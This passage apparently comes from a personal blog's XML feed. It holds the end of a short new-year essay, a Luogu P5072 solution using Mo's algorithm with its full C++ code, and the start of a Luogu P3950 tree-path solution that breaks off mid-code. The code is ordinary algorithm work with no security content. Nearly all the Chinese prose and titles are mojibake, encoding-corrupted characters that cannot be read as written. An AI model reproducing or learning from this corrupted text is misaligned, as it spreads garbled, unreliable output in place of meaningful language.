å‰çš„åæ¬¡ï¼Œäºæ˜¯ä»–å°±æŠŠæˆ‘å½“æˆäº†æœªæ¥thuæ‰å­ï¼Œå°†æ¥pkuå­¦è€…ã€‚<br>è™½ç„¶æˆ‘åˆšåˆšåœ¨æ•™å®¤å¬å®Œç¾¤å‹ï¼ˆæŒ‡tpå¤§çš„å­¦é•¿ï¼‰çš„å®£è®²ï¼Œæˆ‘çŸ¥é“æˆ‘è·Ÿä»–ä»¬å·®äº†å¤šå°‘ã€‚<br>æŠµè¾¾ç›®çš„åœ°ï¼Œä¸‹è½¦ï¼Œç»“è´¦ã€‚æˆ‘æƒ³äº†æƒ³ï¼Œè§‰å¾—å½•éŸ³æ²¡å•¥æ„ä¹‰ï¼Œæˆ‘ç•¥å¸¦æƒ­æ„§åœ°åˆ äº†ï¼Œå½•è¿›å»çš„å¯¹è¯å†æ”¾é€ä¸€å®šä¼šå¾ˆä¹ã€‚<br>æˆ‘åœ¨å®¶å›æœ›è¿‡å»çš„ä¸€å¹´ï¼ŒæƒŠå–œåœ°å‘ç°æˆ‘å®é™…ä¸Šå•¥éƒ½æ²¡å¹²ã€‚è™½ç„¶å¯èƒ½ååŠæ®µå­¦çš„è®¤çœŸäº†ä¸€äº›ï¼Œä½†æœ¬è´¨ä¸Šè¿˜æ˜¯ä¸€ä¸ªæ··å­ã€‚è¿‡å»çš„ä¸€å¹´åƒæ˜¯è¢«åˆ†å—åœ°ä¸¢è¿›äº†è®°å¿†æ·±å¤„ï¼Œæ‰€ä»¥æˆ‘ç°åœ¨å…³äº2019å¹´çš„ç¬¬ä¸€å°è±¡æ ¹æœ¬å°±æ˜¯ç©ºç™½ã€‚å’Œæˆ‘ä¸€æ ·è™šè£ï¼Œæˆ‘çš„è®°å¿†æ€»æ˜¯æŠ¥å–œä¸æŠ¥å¿§çš„ï¼Œæ‰€ä»¥å¯æƒ³è€ŒçŸ¥å»å¹´è¿‡çš„ä¹Ÿå¾ˆå·®ï¼Œâ€œä¹Ÿâ€ã€‚<br>ä¸è¿‡å†æ€ä¹ˆè¯´å¯’å‡ç»ˆäºæ¥äº†ï¼Œè™½ç„¶å¯¹æ˜¥èŠ‚ä¸æ˜¯å¾ˆæ„Ÿå…´è¶£ï¼Œå‘¨å›´ä¹Ÿæ²¡ä»€ä¹ˆè¿‡å¹´çš„æ°”æ°›ï¼Œå¤©æ°”ä¹Ÿå˜å¾—å¯’å†·ï¼Œç½‘è´­çš„å£ç½©ä¹Ÿè¿Ÿè¿Ÿä¸åˆ°è´§ï¼Œå¯’å‡åªæœ‰ä¸‰å‘¨ï¼Œä½†æ˜¯å­¦é•¿è€å¸ˆå®¶é•¿åŒå­¦ä»¬çš„ä¹è§‚å¼€æœ—æˆ–æ˜¯é¼“åŠ±æ‰“æ°”ä¹‹ç±»çš„æ­£é¢æƒ…ç»ªè¿˜æ˜¯è®©æˆ‘è§‰å¾—å¾ˆå¿«ä¹ã€‚å†è¯´ï¼Œåªæœ‰å†¬å¤©ï¼Œå°¤å…¶æ˜¯å—æ–¹è¿™ç§å€Ÿç€å¯’æ½®ç‹å‡è™å¨çš„æ²¡æœ‰å®é™…æ€ä¼¤åŠ›çš„å†¬å¤©ï¼Œæ‰æ˜¯ä½“ä¼šæ¸©æš–è¢«çªçš„å®è´µä»·å€¼çš„æœ€å¥½è¾…åŠ©ã€‚<br>æ€»ä¹‹æˆ‘ä¼šå¾ˆå¼€å¿ƒåœ°è¿‡ä¸€ä¸ªæˆ–å……å®æˆ–æ‘¸é±¼ï¼Œå­¦ä¸å­¦çœ‹å±æœºæ„Ÿï¼ˆæŒ‡æ˜å¹´å°±è¦é«˜è€ƒï¼‰çš„ä¸€èˆ¬å¯’å‡ã€‚æˆ‘æƒ³ä¸€èˆ¬èˆ¬åœ°å¥½å¥½å­¦ç‚¹ä»€ä¹ˆï¼Œè®©è‡ªå·±å…¼é¡¾æ‘¸é±¼çš„å¿«ä¹å’Œâ€œå­¦ä¹ â€çš„è™šå‡æ»¡è¶³æ„Ÿã€‚<br>åœæ­¢çå¥¶ï¼Œè¿˜æ˜¯å¥½å¥½å­¦å­¦å§ï¼Ÿä½ åˆä¸æ˜¯å‚»å­ã€‚<br>å””ã€‚æ¯•ç«Ÿé€€å½¹ä»¥åï¼Œæ–‡åŒ–è¯¾çœ‹èµ·æ¥ä¹Ÿä¸æ˜¯é‚£ä¹ˆé¢ç›®å¯æ†ï¼Ÿ<br>æƒ³åƒçƒ¤è‚‰ã€‚æƒ³å¬å¥½æ­Œã€‚æƒ³ç¡å¥½è§‰ã€‚æƒ³çœ‹å¥½ç•ªã€‚<br>ä»æœªæ¥çš„ä¸ªäººä»·å€¼ä¸­æ©ç‚¹æ²¹ï¼Œå˜ä¸ºå¿«ä¹æ´’åœ¨æˆ‘å’Œå‘¨å›´äººçš„å¯’å‡é‡Œï¼Œä¹æ„è‡³æã€‚<br>æ­¤æ–‡ç« å› ä¸ºæˆ‘è…¹ä¸­ç©ºç©ºæ²¡æœ‰æ–‡é‡‡æ˜¾å¾—å‡Œä¹±æ— æ¯”åˆæ¯ç‡¥ï¼Œè§ç¬‘äº†ã€‚<br>æ–°å¹´å¿«ä¹ã€‚<br>ä»¥åŠï¼Œcyå­¦é•¿å¥½å¸…ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> éšç¬” </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>æ´›è°·:P5072 [Ynoi2015]ç›¼å›å‹¿å¿˜</title>
      <link href="/2019/10/08/%E6%B4%9B%E8%B0%B7P5072%20%5BYnoi2015%5D%E7%9B%BC%E5%90%9B%E5%8B%BF%E5%BF%98/"/>
      <url>/2019/10/08/%E6%B4%9B%E8%B0%B7P5072%20%5BYnoi2015%5D%E7%9B%BC%E5%90%9B%E5%8B%BF%E5%BF%98/</url>
      
        <content type="html"><![CDATA[<p>åŸé¢˜åœ°å€:<a href="https://www.luogu.org/problem/P5072">https://www.luogu.org/problem/P5072</a>  </p><h3 id="é¢˜ç›®ç®€è¿°"><a href="#é¢˜ç›®ç®€è¿°" class="headerlink" title="é¢˜ç›®ç®€è¿°"></a>é¢˜ç›®ç®€è¿°</h3><p>ç»™å®šä¸€ä¸ªåºåˆ—ï¼Œæ¯æ¬¡æŸ¥è¯¢ä¸€ä¸ªåŒºé—´[l,r]ä¸­æ‰€æœ‰å­åºåˆ—åˆ†åˆ«å»é‡åçš„å’Œmod p</p><hr><h3 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h3><p>æˆ‘ä»¬è€ƒè™‘æ¯ä¸ªæ•°çš„è´¡çŒ®ã€‚å³è¯¥åŒºé—´å†…å«æœ‰è¿™ä¸ªæ•°çš„å­åºåˆ—ä¸ªæ•°ã€‚ç”¨è¡¥é›†è½¬åŒ–ä¸ºä¸å«è¿™ä¸ªæ•°çš„å­åºåˆ—ä¸ªæ•°ã€‚<br>é‚£ä¹ˆï¼Œå‡è®¾è¿™ä¸ªæ•°åœ¨[l,r]å†…å‡ºç°äº†kæ¬¡ï¼Œåˆ™ä¸€å…±æœ‰2^(r-l+1) -2^(r-l+1-k)ä¸ªå­åºåˆ—åŒ…å«è¿™ä¸ªæ•°ã€‚<br>æœ¬é¢˜å¯ä»¥ç¦»çº¿ï¼Œå› æ­¤é€‰æ‹©ä½¿ç”¨è«é˜Ÿï¼Œè¿‡ç¨‹ä¸­ç»´æŠ¤cnt[k]è¡¨ç¤ºåŒºé—´å†…æ°å¥½å‡ºç°kæ¬¡çš„æ•°å­—ä¸ªæ•°ï¼Œç»´æŠ¤sum[j]è¡¨ç¤ºåŒºé—´å†…æ°å¥½å‡ºç°jæ¬¡çš„æ•°å­—ä¹‹å’Œï¼ˆåŒºé—´å†…å‡ºç°æ¬¡æ•°ç›¸åŒçš„æ•°ï¼Œå¯¹äºè¿™äº›æ•°ï¼ŒåŒºé—´ä¸­åŒ…å«è¿™äº›æ•°çš„å­åºåˆ—ä¸ªæ•°éƒ½ç›¸åŒï¼Œå› æ­¤å­˜æ•°å­—ä¹‹å’Œå°±è¡Œï¼‰ã€‚<br>ç„¶è€Œè¿™æ ·æ—¶é—´å¤æ‚åº¦ä¸ºO(è¯¢é—®æ¬¡æ•°*å•æ¬¡è¯¢é—®å¤æ‚åº¦)&#x3D;O(n*max(sqrt(n),n))&#x3D;O(nm)ï¼Œå¹¶ä¸å¯è¡Œã€‚æˆ‘ä»¬å‘ç°æ—¶é—´ç“¶é¢ˆä¸åœ¨è«é˜Ÿçš„sqrt(n)ï¼Œè€Œæ˜¯åœ¨å•æ¬¡æŸ¥è¯¢ä¸­æ±‚è§£çš„å¤æ‚åº¦nã€‚<br>æœ‰2ä¸ªå¥—è·¯å¯ä¾›ä½¿ç”¨ï¼šå‡ºç°æ¬¡æ•°å¤§äºsqrt(n)çš„æ•°ä¸è¶…è¿‡sqrt(n)ä¸ªï¼Œå€¼ä¸ä¸º0çš„cnt[k]å°‘äº2*sqrt(n)ä¸ªï¼ˆåè¯æ˜“å¾—ï¼Œæœ¬è´¨ç±»ä¼¼ï¼‰ã€‚ </p><ul><li>å¯¹äºç¬¬ä¸€ä¸ªå¥—è·¯ï¼Œæˆ‘ä»¬åˆ†ç±»è®¨è®ºï¼šå‡ºç°æ¬¡æ•°å°äºç­‰äºsqrt(n)ï¼Œåˆ™ç»Ÿè®¡æ¯ä¸ªå‡ºç°æ¬¡æ•°çš„æ•°å­—ä¹‹å’Œï¼›å¤§äºsqrt(n)çš„ç”¨å“ˆå¸Œè¡¨(unordered_set,C++11)å­˜ä¸‹å…·ä½“çš„æ•°å­—å’Œå…¶å‡ºç°æ¬¡æ•°ã€‚è¿™æ ·æ¯æ¬¡æŸ¥è¯¢æ˜¯sqrt(n)ã€‚  </li><li>ç¬”è€…ä½¿ç”¨çš„åˆ™æ˜¯ç¬¬äºŒä¸ªå¥—è·¯ï¼šval[x]è¡¨ç¤ºå‡ºç°æ¬¡æ•°æ°å¥½ä¸ºxçš„æ•°å­—ä¹‹å’Œï¼ˆåŒä¸Šæ–‡çš„sum[j]ï¼‰ã€‚éšç€è«é˜Ÿl,ræŒ‡é’ˆçš„ç§»åŠ¨ï¼ŒæŠŠæ‰€æœ‰å¯èƒ½å˜ä¸ºé0çš„val[x]è®°ä¸‹æ¥ï¼ŒæŒ‡é’ˆç§»åŠ¨å®Œæ¯•åå†å¯¹å…¶è¿›è¡Œç­›é€‰ï¼ŒæŠŠç¡®å®é0çš„val[x]ä¿ç•™ï¼Œå…¶ä»–å»é™¤ã€‚è¿™æ ·è®¡ç®—å•æ¬¡ç­”æ¡ˆçš„å¤æ‚åº¦å°±ç­‰åŒäºå•æ¬¡æŸ¥è¯¢ä¸­è«é˜ŸæŒ‡é’ˆç§»åŠ¨çš„å¹³å‡æ­¥æ•°ï¼šéƒ½æ˜¯sqrt(n)çº§åˆ«ã€‚è¿™æ ·åšä¸éœ€è¦ç”¨åˆ°å“ˆå¸Œè¡¨ä¹‹ç±»çš„ï¼Œå¸¸æ•°å°äº†å¾ˆå¤šï¼Œç”šè‡³ä¸éœ€è¦è¯»å…¥ä¼˜åŒ–ä¹Ÿèƒ½è½»æ¾è¿‡ã€‚</li></ul><p>è¿˜æ²¡å®Œã€‚æˆ‘ä»¬å‘ç°æ¨¡æ•°æ˜¯ä¸å®šçš„ï¼Œä¸ºäº†ä¿è¯å•æ¬¡æŸ¥è¯¢çš„å¤æ‚åº¦å‹åœ¨sqrt(n)ä»¥å†…ï¼Œæˆ‘ä»¬è¿˜æœ‰æœ€åä¸€ä»¶äº‹æƒ…è¦åšï¼šåœ¨sqrt(n)çš„æ—¶é—´å†…æ±‚å‡º2^(r-l+1) å’Œæ‰€æœ‰çš„2^(r-l+1-k)ã€‚è¿™é‡Œå®‰åˆ©ä¸€ä¸ªç¥å¥‡çš„æ–¹å¼ï¼šæ¯æ¬¡æŸ¥è¯¢åªéœ€è¦åšä¸€æ¬¡æ—¶é—´å¤æ‚åº¦ä¸ºsqrt(n)çš„é¢„å¤„ç†å°±å¯ä»¥O(1)æŸ¥è¯¢äº†ã€‚<br>å‡è®¾æŸ¥è¯¢åŒºé—´é•¿åº¦ä¸ºlen(len&#x3D;r-l+1)ï¼Œæˆ‘ä»¬è®°siz&#x3D;sqrt(len)ï¼Œè€Œåè®¡ç®—2^0 , 2^1 , 2^2 â€¦ 2^sqrt(len)ï¼Œå­˜åœ¨æ•°ç»„pow1ä¸­ï¼›å†è®¡ç®—2^sqrt(len) , 2^(2*sqrt(len)) , 2^(3*sqrt(len)) , 2^(4*sqrt(len))â€¦ , 2^(sqrt(len)*sqrt(len))ï¼Œå­˜åœ¨æ•°ç»„pow[2]ä¸­ã€‚ä»¥ä¸Šè®¡ç®—éƒ½åœ¨mod pæ„ä¹‰ä¸‹è¿›è¡Œã€‚<br>è¿™æ ·æ±‚2çš„ä»»æ„æ¬¡æ–¹éƒ½å¯ä»¥O(1)å‡ºè§£:2^k &#x3D;2^(k&#x2F;siz) *2^(k%siz)&#x3D;pow2[k&#x2F;siz]*pow1[k%siz]ï¼ˆè®°å¾—æ¨¡pï¼‰ã€‚</p><hr><h3 id="ä»£ç "><a href="#ä»£ç " class="headerlink" title="ä»£ç "></a>ä»£ç </h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXN 100005 </span></span><br><span class="line"><span class="type">int</span> n,m;</span><br><span class="line"><span class="type">int</span> a[MAXN],val[MAXN*<span class="number">2</span>],cnt[MAXN],ans[MAXN];</span><br><span class="line"><span class="type">int</span> tot,blosiz,powsiz;</span><br><span class="line"><span class="type">int</span> bel[MAXN],pow1[MAXN],pow2[MAXN];</span><br><span class="line"><span class="type">bool</span> calced[MAXN];</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> sum[MAXN];</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">query</span> &#123;</span><br><span class="line"><span class="type">int</span> id,l,r,p;</span><br><span class="line"><span class="type">bool</span> <span class="keyword">operator</span>&lt;(<span class="type">const</span> query &amp;sb) <span class="type">const</span> &#123;</span><br><span class="line"><span class="keyword">return</span> bel[l]!=bel[sb.l] ? bel[l]&lt;bel[sb.l] : (bel[l]&amp;<span class="number">1</span> ? r&lt;sb.r : r&gt;sb.r);</span><br><span class="line">&#125;</span><br><span class="line">&#125; q[MAXN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">int</span> x)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">sum[cnt[x]]-=x;</span><br><span class="line">cnt[x]++;</span><br><span class="line">sum[cnt[x]]+=x;</span><br><span class="line">++tot;</span><br><span class="line">val[tot]=cnt[x];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">del</span><span class="params">(<span class="type">int</span> x)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">sum[cnt[x]]-=x;</span><br><span class="line">cnt[x]--;</span><br><span class="line">sum[cnt[x]]+=x;</span><br><span class="line">++tot;</span><br><span class="line">val[tot]=cnt[x];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">power</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1LL</span>*pow1[x%powsiz]*pow2[x/powsiz]%p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;n,&amp;m);</span><br><span class="line">blosiz=<span class="built_in">sqrt</span>(n);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++) </span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]),bel[i]=(i<span class="number">-1</span>)/blosiz;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">1</span>;i&lt;=m;i++) </span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>,&amp;q[i].l,&amp;q[i].r,&amp;q[i].p),q[i].id=i;</span><br><span class="line"><span class="built_in">sort</span>(q+<span class="number">1</span>,q+m+<span class="number">1</span>);</span><br><span class="line"><span class="type">int</span> l=<span class="number">1</span>,r=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">1</span>;i&lt;=m;i++) &#123;</span><br><span class="line">        <span class="keyword">while</span> (l&gt;q[i].l) <span class="built_in">add</span>(a[--l]);</span><br><span class="line">        <span class="keyword">while</span> (r&lt;q[i].r) <span class="built_in">add</span>(a[++r]);</span><br><span class="line">        <span class="keyword">while</span> (l&lt;q[i].l) <span class="built_in">del</span>(a[l++]);</span><br><span class="line">        <span class="keyword">while</span> (r&gt;q[i].r) <span class="built_in">del</span>(a[r--]);</span><br><span class="line">        </span><br><span class="line"><span class="type">int</span> newtot=<span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> len=r-l+<span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j=<span class="number">1</span>;j&lt;=tot;j++) </span><br><span class="line"><span class="keyword">if</span> (val[j]&amp;&amp;sum[val[j]]!=<span class="number">0</span>&amp;&amp;!calced[val[j]]) </span><br><span class="line">calced[val[j]]=<span class="number">1</span>,val[++newtot]=val[j];</span><br><span class="line">tot=newtot;</span><br><span class="line"></span><br><span class="line">powsiz=<span class="built_in">sqrt</span>(len)+<span class="number">1</span>;</span><br><span class="line">pow1[<span class="number">0</span>]=pow2[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j=<span class="number">1</span>;j&lt;=powsiz;j++) </span><br><span class="line">pow1[j]=(pow1[j<span class="number">-1</span>]+pow1[j<span class="number">-1</span>])%q[i].p;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j=<span class="number">1</span>;j*powsiz&lt;=len;j++) </span><br><span class="line">pow2[j]=<span class="number">1LL</span>*pow2[j<span class="number">-1</span>]*pow1[powsiz]%q[i].p;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> powLen=<span class="built_in">power</span>(len,q[i].p);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j=<span class="number">1</span>;j&lt;=tot;j++) &#123;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> num=sum[val[j]]%q[i].p;</span><br><span class="line">ans[q[i].id]=(ans[q[i].id]+num*(powLen-<span class="built_in">power</span>(len-val[j],q[i].p)))%q[i].p;</span><br><span class="line">calced[val[j]]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">ans[q[i].id]+=q[i].p;</span><br><span class="line">ans[q[i].id]%=q[i].p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">1</span>;i&lt;=m;i++) </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans[i]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> OI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åˆ†å— </tag>
            
            <tag> å“ˆå¸Œ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ´›è°·:P3950 éƒ¨è½å†²çª</title>
      <link href="/2018/10/28/%E6%B4%9B%E8%B0%B7P3950%20%E9%83%A8%E8%90%BD%E5%86%B2%E7%AA%81/"/>
      <url>/2018/10/28/%E6%B4%9B%E8%B0%B7P3950%20%E9%83%A8%E8%90%BD%E5%86%B2%E7%AA%81/</url>
      
        <content type="html"><![CDATA[<p>åŸé¢˜åœ°å€:<a href="https://www.luogu.org/problemnew/show/P3950">https://www.luogu.org/problemnew/show/P3950</a>  </p><h3 id="é¢˜ç›®ç®€è¿°"><a href="#é¢˜ç›®ç®€è¿°" class="headerlink" title="é¢˜ç›®ç®€è¿°"></a>é¢˜ç›®ç®€è¿°</h3><p>ç»™å®šä¸€æ£µæ ‘ï¼Œæ¯æ¬¡ç»™å®šä¸€ä¸ªæ“ä½œï¼Œæœ‰å¦‚ä¸‹ä¸¤ç§ï¼š  </p><ol><li>å°†æŸæ¡è¾¹æŸ“é»‘<br>2.è¯¢é—®ç»™å®šçš„u,vä¸¤ç‚¹é—´æ˜¯å¦æœ‰è¾¹è¢«æŸ“é»‘</li></ol><hr><p>###æ€è·¯<br>è¯¢é—®ä¸¤ç‚¹é—´æ˜¯å¦æœ‰è¾¹è¢«æŸ“é»‘åªéœ€è¦åœ¨æ±‚LCAæ—¶åˆ¤ä¸€ä¸‹å°±è¡Œã€‚æ‰€ä»¥ç›´æ¥ä¸Šæ ‘é“¾å‰–åˆ†å³å¯ã€‚<br>æœ¬é¢˜ä¸éœ€è¦ä½¿ç”¨çº¿æ®µæ ‘ï¼Œä½¿ç”¨æ ‘çŠ¶æ•°ç»„æŸ¥è¯¢è·¯å¾„ä¸Šæ˜¯å¦æœ‰ä»»æ„ä¸€æ®µåŒºé—´å’Œä¸ä¸º0å³å¯ã€‚</p><hr><h3 id="ä»£ç "><a href="#ä»£ç " class="headerlink" title="ä»£ç "></a>ä»£ç </h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> lowbit(x) x&amp;-x</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; P;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn = <span class="number">1000000</span>;</span><br><span class="line">P war[maxn];</span><br><span class="line"><span class="type">int</span> fa[maxn], dep[maxn], val[maxn], sz[maxn], top[maxn], son[maxn];</span><br><span class="line"><span class="type">int</span> tre[maxn];</span><br><span class="line"><span class="type">int</span> tot;</span><br><span class="line"><span class="type">int</span> cntw;</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">int</span> <span class="title">read</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> ch, x = <span class="number">0</span>, f = <span class="number">1</span>;ch = <span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">while</span>((ch &lt; <span class="string">&#x27;0&#x27;</span> || ch &gt; <span class="string">&#x27;9&#x27;</span>) &amp;&amp; ch != <span class="string">&#x27;-&#x27;</span>) ch = <span class="built_in">getchar</span>();</span><br><span class="line">    ch == <span class="string">&#x27;-&#x27;</span> ? f = <span class="number">-1</span>, ch = <span class="built_in">getchar</span>() : <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(ch &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; ch &lt;= <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">        x = x * <span class="number">10</span> + ch - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        ch = <span class="built_in">getchar</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> f * x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Edge</span> &#123;</span><br><span class="line">    <span class="type">int</span> to, len, nxt;</span><br><span class="line">    <span class="built_in">Edge</span>() &#123;&#125;</span><br><span class="line">    <span class="built_in">Edge</span>(<span class="type">int</span> _to, <span class="type">int</span> _len, <span class="type">int</span> _nxt):<span class="built_in">to</span>(_to), <span class="built_in">len</span>(_len), <span class="built_in">nxt</span>(_nxt) &#123;&#125;</span><br><span class="line">&#125;E[maxn];</span><br><span class="line"><span class="type">int</span> h[maxn], cnte;</span><br><span class="line"><span class="type">int</span> L[maxn], R[maxn];</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">update</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> add)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = x;i &lt;= maxn; i += <span class="built_in">lowbit</span>(i)) tre[i] += add;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">query</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> ans = <span class="number">0</span>; <span class="keyword">for</span>(<span class="type">int</span> i = x; i; i -= <span class="built_in">lowbit</span>(i)) ans += tre[i]; <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">add_edge</span><span class="params">(<span class="type">int</span> u, <span class="type">int</span> v, <span class="type">int</span> w)</span> </span>&#123;</span><br><span class="line">    E[++cnte] = <span class="built_in">Edge</span>(v, w, h[u]), h[u] = cnte;</span><br><span class="line">    E[++cnte] = <span 